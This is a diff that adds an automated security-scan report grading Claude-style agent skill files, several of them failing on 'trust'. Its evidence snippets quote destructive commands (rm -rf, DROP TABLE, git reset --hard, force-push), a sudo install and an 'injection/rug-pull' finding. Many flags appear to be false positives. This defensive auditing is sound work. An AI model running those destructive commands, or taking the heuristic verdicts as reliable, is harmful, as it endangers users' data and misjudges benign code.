+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: qa
+    format: claude-native
+    grade: F
+    overall_score: 0.4
+    file_path: SKILL.md
+    summary: "Poor skill with 15 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.4	0.15	0
+    actionability	0.375	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-6	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"0 --query \"qa testing bug regression flake fixture\" 2>/dev/null || true fi ``` If `CROSS_PROJECT` is `unset` (first time): Use AskUserQuestion: > gstack can search learnings from your other projects"
+  - entity_type: skill
+    entity_name: qa-only
+    format: claude-native
+    grade: F
+    overall_score: 0.4
+    file_path: SKILL.md
+    summary: "Poor skill with 15 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.4	0.15	0
+    actionability	0.375	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-6	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"kills/gstack/bin/gstack-learnings-search --limit 10 2>/dev/null || true fi ``` If `CROSS_PROJECT` is `unset` (first time): Use AskUserQuestion: > gstack can search learnings from your other projects"
+  - entity_type: skill
+    entity_name: retro
+    format: claude-native
+    grade: D
+    overall_score: 0.505
+    file_path: SKILL.md
+    summary: "Needs work skill with 12 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-6	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"kills/gstack/bin/gstack-learnings-search --limit 10 2>/dev/null || true fi ``` If `CROSS_PROJECT` is `unset` (first time): Use AskUserQuestion: > gstack can search learnings from your other projects"
+  - entity_type: skill
+    entity_name: review
+    format: claude-native
+    grade: D
+    overall_score: 0.505
+    file_path: SKILL.md
+    summary: "Needs work skill with 12 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-6	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"kills/gstack/bin/gstack-learnings-search --limit 10 2>/dev/null || true fi ``` If `CROSS_PROJECT` is `unset` (first time): Use AskUserQuestion: > gstack can search learnings from your other projects"
+  - entity_type: skill
+    entity_name: scrape
+    format: claude-native
+    grade: D
+    overall_score: 0.535
+    file_path: SKILL.md
+    summary: "Needs work skill with 11 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: setup-browser-cookies
+    format: claude-native
+    grade: D
+    overall_score: 0.637
+    file_path: SKILL.md
+    summary: "Needs work skill with 9 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.85	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.683	0.2	0
+    safety	1.0	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: setup-deploy
+    format: claude-native
+    grade: F
+    overall_score: 0.499
+    file_path: SKILL.md
+    summary: "Poor skill with 12 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.57	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: setup-gbrain
+    format: claude-native
+    grade: D
+    overall_score: 0.515
+    file_path: SKILL.md
+    summary: "Needs work skill with 13 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.05	0.2	7
+    findings[7	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	code	0.9	active	Destructive rm -rf on root or home directory	">&2 echo \"PGLite directory at ~/.gbrain/pglite/ may be in a partial state \u2014 \\`rm -rf ~/.gbrain/pglite\\` if needed before retrying.\" >&2 exit 1 fi echo \"Switched to"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-3	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-4	EXFILTRATION	high	content	0.75	active	May leak secrets	"\"tools/list\",\"params\":{}}' \\ <YOUR_MCP_URL> ``` Do NOT print the actual token in the curl command \u2014 leave the placeholder `<YOUR_TOKEN>` so the snippet is safe to copy i"
+    trust-exfiltration-5	EXFILTRATION	high	content	0.75	active	May leak secrets (credential in output)	",\"id\":1,\"method\":\"tools/list\",\"params\":{}}' \\ <YOUR_MCP_URL> ``` Do NOT print the actual token in the curl command \u2014 leave the placeholder `<YOUR_TOKEN>` so the snippet is sa"
+    trust-exfiltration-6	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-7	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: ship
+    format: claude-native
+    grade: D
+    overall_score: 0.505
+    file_path: SKILL.md
+    summary: "Needs work skill with 12 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-6	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"0 --query \"release ship version changelog merge pr\" 2>/dev/null || true fi ``` If `CROSS_PROJECT` is `unset` (first time): Use AskUserQuestion: > gstack can search learnings from your other projects"
+  - entity_type: skill
+    entity_name: skillify
+    format: claude-native
+    grade: D
+    overall_score: 0.535
+    file_path: SKILL.md
+    summary: "Needs work skill with 11 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: sync-gbrain
+    format: claude-native
+    grade: D
+    overall_score: 0.535
+    file_path: SKILL.md
+    summary: "Needs work skill with 11 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: unfreeze
+    format: claude-native
+    grade: F
+    overall_score: 0.394
+    file_path: SKILL.md
+    summary: "Poor skill with 15 suggestions for improvement (weakest: safety)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.63	0.2	0
+    clarity	0.57	0.15	0
+    actionability	0.5	0.2	0
+    safety	0.05	0.15	0
+    testability	0.45	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
